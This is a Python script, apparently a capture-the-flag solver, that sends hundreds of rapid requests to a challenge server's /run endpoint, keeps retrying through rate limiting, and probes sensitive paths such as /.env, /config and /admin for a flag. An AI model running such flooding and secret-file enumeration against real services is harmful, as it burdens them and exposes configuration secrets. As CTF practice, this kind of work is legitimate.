#!/usr/bin/env python3
"""
Ultimate Kohli solver - try EVERYTHING
"""
import requests
import time
import re
import random

BASE_URL = "http://chall-bcaad8ca.evt-207.glabs.ctf7.com"

def extract_flag(text):
    """Extract flag from text"""
    match = re.search(r'(Kaal|FLAG)\{[^}]+\}', text)
    return match.group(0) if match else None

def approach_1_massive_burst():
    """Send 500 requests as fast as possible"""
    print("\n[Approach 1: Massive Burst - 500 requests]")
    session = requests.Session()
    
    for i in range(1, 501):
        try:
            r = session.post(f"{BASE_URL}/run", json={"cmd": "help"}, timeout=5)
            if r.status_code == 200:
                data = r.json()
                output = data.get('output', '')
                
                if 'Kaal{' in output or 'FLAG{' in output:
                    print(f"\n✓ FLAG at request {i}: {output}")
                    return extract_flag(output)
                
                if i % 50 == 0:
                    print(f"  {i}/500...")
            
            time.sleep(0.05)
        except:
            pass
    
    return None

def approach_2_wait_and_burst():
    """Wait, then send burst"""
    print("\n[Approach 2: Wait 30s, then burst]")
    print("Waiting 30 seconds...")
    time.sleep(30)
    
    session = requests.Session()
    print("Sending burst...")
    
    for i in range(1, 201):
        try:
            r = session.post(f"{BASE_URL}/run", json={"cmd": "help"}, timeout=5)
            if r.status_code == 200:
                data = r.json()
                output = data.get('output', '')
                
                if 'Kaal{' in output or 'FLAG{' in output:
                    print(f"\n✓ FLAG at request {i}: {output}")
                    return extract_flag(output)
                
                if i % 25 == 0:
                    print(f"  {i}/200...")
            
            time.sleep(0.03)
        except:
            pass
    
    return None

def approach_3_random_commands():
    """Send random commands repeatedly"""
    print("\n[Approach 3: Random commands]")
    session = requests.Session()
    
    commands = ['help', 'flag', 'check', 'status', 'test', 'ping']
    
    for i in range(1, 301):
        cmd = random.choice(commands)
        try:
            r = session.post(f"{BASE_URL}/run", json={"cmd": cmd}, timeout=5)
            if r.status_code == 200:
                data = r.json()
                output = data.get('output', '')
                
                if 'Kaal{' in output or 'FLAG{' in output:
                    print(f"\n✓ FLAG at request {i} with '{cmd}': {output}")
                    return extract_flag(output)
                
                if i % 50 == 0:
                    print(f"  {i}/300...")
            
            time.sleep(0.1)
        except:
            pass
    
    return None

def approach_4_specific_timing():
    """Try specific timing patterns"""
    print("\n[Approach 4: Specific timing - 1 req/sec for 200 seconds]")
    session = requests.Session()
    
    for i in range(1, 201):
        try:
            r = session.post(f"{BASE_URL}/run", json={"cmd": "help"}, timeout=5)
            if r.status_code == 200:
                data = r.json()
                output = data.get('output', '')
                
                if 'Kaal{' in output or 'FLAG{' in output:
                    print(f"\n✓ FLAG at request {i}: {output}")
                    return extract_flag(output)
                
                if i % 20 == 0:
                    print(f"  {i}/200...")
            
            time.sleep(1.0)  # Exactly 1 second between requests
        except:
            pass
    
    return None

def approach_5_check_other_endpoints():
    """Check if flag is in other endpoints"""
    print("\n[Approach 5: Check other endpoints]")
    session = requests.Session()
    
    endpoints = [
        '/flag', '/flag.txt', '/.env', '/config', '/admin',
        '/secret', '/hidden', '/debug', '/api/flag', '/robots.txt'
    ]
    
    for endpoint in endpoints:
        try:
            r = session.get(f"{BASE_URL}{endpoint}", timeout=5)
            if r.status_code == 200:
                print(f"  {endpoint}: {r.status_code}")
                if 'Kaal{' in r.text or 'FLAG{' in r.text:
                    print(f"\n✓ FLAG in {endpoint}: {r.text[:200]}")
                    return extract_flag(r.text)
        except:
            pass
    
    return None

def approach_6_ultra_persistent():
    """Just keep trying with proper delays"""
    print("\n[Approach 6: Ultra persistent - 400 requests with smart delays]")
    session = requests.Session()
    
    rate_limit_count = 0
    
    for i in range(1, 401):
        try:
            r = session.post(f"{BASE_URL}/run", json={"cmd": "help"}, timeout=10)
            
            if r.status_code == 429:
                rate_limit_count += 1
                if i % 20 == 0:
                    print(f"  {i}/400 (rate limited: {rate_limit_count})")
                time.sleep(2)  # Wait longer when rate limited
                continue
            
            if r.status_code == 200:
                data = r.json()
                output = data.get('output', '')
                
                if 'Kaal{' in output or 'FLAG{' in output:
                    print(f"\n✓ FLAG at request {i}: {output}")
                    return extract_flag(output)
                
                if i % 20 == 0:
                    print(f"  {i}/400 (rate limited: {rate_limit_count})")
            
            time.sleep(0.2)
        except Exception as e:
            if i % 50 == 0:
                print(f"  {i}/400 - Error: {e}")
            time.sleep(0.5)
    
    return None

def main():
    print("="*80)
    print("KOHLI ULTIMATE SOLVER")
    print("Trying 6 different approaches")
    print("="*80)
    
    approaches = [
        ("Massive Burst", approach_1_massive_burst),
        ("Wait and Burst", approach_2_wait_and_burst),
        ("Random Commands", approach_3_random_commands),
        ("Specific Timing", approach_4_specific_timing),
        ("Other Endpoints", approach_5_check_other_endpoints),
        ("Ultra Persistent", approach_6_ultra_persistent),
    ]
    
    for name, func in approaches:
        print(f"\n{'='*80}")
        print(f"TRYING: {name}")
        print('='*80)
        
        result = func()
        
        if result:
            print(f"\n{'='*80}")
            print("🎉 SUCCESS! FLAG FOUND! 🎉")
            print('='*80)
            print(f"\nFLAG: {result}")
            print('='*80)
            return result
        
        print(f"\n{name} failed, moving to next approach...")
        time.sleep(2)
    
    print(f"\n{'='*80}")
    print("All approaches exhausted")
    print("The challenge may require manual interaction or a different method")
    print('='*80)

if __name__ == "__main__":
    main()
